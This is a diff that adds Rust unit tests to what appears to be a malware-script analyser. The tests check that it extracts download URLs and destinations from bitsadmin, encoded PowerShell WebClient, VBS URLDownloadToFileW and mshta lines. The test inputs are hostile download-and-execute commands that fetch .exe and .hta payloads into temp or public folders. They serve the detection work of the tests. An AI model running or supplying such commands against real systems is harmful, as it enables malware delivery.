@@ -14111,6 +14111,22 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_transfer_accepts_schemeless_domain_path() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"bitsadmin /transfer "mdj" /download /priority FOREGROUND "courtage-psd.com/Beopajki.exe" "%temp%\out.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://courtage-psd.com/Beopajki.exe" && dst == "%temp%\\out.exe"
+            )
+        });
+        assert!(has, "no schemeless BitsadminDownload: {:?}", env.traits);
+    }
+
+    #[test]
     fn bitsadmin_attached_transfer_emits_download() {
         let raw =
             "bitsadmin /transfer:myjob /download /priority foreground http://x/y.exe C:\\temp\\y.exe";
@@ -17269,6 +17285,25 @@ $clnt.DownloadFile($url,$file)
     }
 
     #[test]
+    fn webclient_downloadfile_schemeless_domain_path_url_extracted() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFile("cdn-webclient.com/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://cdn-webclient.com/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "schemeless WebClient DownloadFile URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn bare_downloadfile_literal_destination_extracted() {
         let ps = r#"DownloadFile('https://bare-downloadfile-dst.example/tool.exe','C:\Users\Public\bare.exe')"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -19369,6 +19404,28 @@ mod vbs_url_extraction_tests {
             )
         });
         assert!(has, "no Download trait: {:?}", env.traits);
+    }
+
+    #[test]
+    fn vbs_urldownloadtofile_schemeless_domain_path_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u
+u = "vbs-urldown-schemeless.com/payload.exe"
+URLDownloadToFileW 0, u, "wide.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urldown-schemeless.com/payload.exe"
+                        && dst.as_deref() == Some("wide.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from schemeless VBS URLDownloadToFileW: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -30751,6 +30808,70 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
         assert!(
             has,
             "wget slash --directory-prefix destination was not resolved to the file path: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_schemeless_domain_path_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer "mdj" /download /priority FOREGROUND "courtage-psd.com/Beopajki.exe" "%temp%\out.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://courtage-psd.com/Beopajki.exe" && dst == "%temp%\\out.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured schemeless bitsadmin download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "bitsadmin /transfer j1 /download https://bits-mshta.example/payload.hta C:\\Temp\\payload.hta\r\nmshta C:\\Temp\\payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\payload.hta"
+                            && url == "https://bits-mshta.example/payload.hta"
+                )
+            }),
+            "bitsadmin-downloaded HTA in deob text was not linked to mshta: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn mshta_downloaded_hta_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o payload.hta https://mshta-deob-local.example/payload.hta".to_string(),
+            src: "https://mshta-deob-local.example/payload.hta".to_string(),
+            dst: Some("payload.hta".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("mshta payload.hta", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta payload.hta"
+                            && url == "https://mshta-deob-local.example/payload.hta"
+                )
+            }),
+            "mshta downloaded HTA in deob text was not typed: {:?}",
             env.traits
         );
     }
